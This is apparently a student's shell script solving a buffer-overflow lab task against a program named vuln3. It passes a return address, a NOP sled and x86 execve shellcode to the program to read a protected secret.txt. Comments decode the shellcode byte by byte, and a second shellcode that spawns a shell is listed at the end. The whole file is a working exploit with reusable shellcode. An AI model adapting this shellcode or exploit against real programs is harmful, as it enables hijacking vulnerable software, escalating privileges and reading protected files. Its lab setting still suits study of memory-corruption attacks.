#!/bin/sh
#RetAdd=$(python -c 'print "\x0b\x85\x04\x08"')
#NOPs=$(python -c 'print "\x90"*9001') #It's over 9000!
#MidNowhere=$(python -c 'print "\x01\xf7\xff\xbf"')

/home/task3/vuln3 $(python -c 'print "\x01\xf7\xff\xbf" + "\x90"*900 + "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x63\x72\x65\x74\x68\x2f\x2f\x73\x65\x68\x61\x73\x6b\x33\x68\x2f\x2f\x2f\x74\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"') 1040 | tr -d '\n'

# Adapted from:
# shell-storm.org/shellcode/files/shellcode-758.php
# IMPROVISE. ADAPT. OVERCOME

# \x31\xc0\x50
# set eax to null

# \x68\x2f\x63\x61\x74
# \x68\x2f\x62\x69\x6e
# /bin/cat

# \x89\xe3\x50
# push cat address to ebx

# \x68\x2e\x74\x78\x74
# \x68\x63\x72\x65\x74
# \x68\x2f\x2f\x73\x65
# \x68\x61\x73\x6b\x33
# \x68\x2f\x2f\x2f\x74
# \x68\x68\x6f\x6d\x65
# \x68\x2f\x2f\x2f\x2f

# /home			/task3			  /secret.txt
#  \x68\x6f\x6d\x65      \x74\x61\x73\x6b\x33      \x73\x65\x63\x72\x65\x74\x2e\x74\x78\x74

# \x89\xe1\x50
# push secret address to ecx

# \x51\x53\x89\xe1
# set ecx to (cat, secret)

# \xb0\x0b\xcd\x80
# execute!

#   \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x63\x72\x65\x74\x68\x2f\x2f\x73\x65\x68\x61\x73\x6b\x33\x68\x2f\x2f\x2f\x74\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80

# === other stuff ===

# spawnshell \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
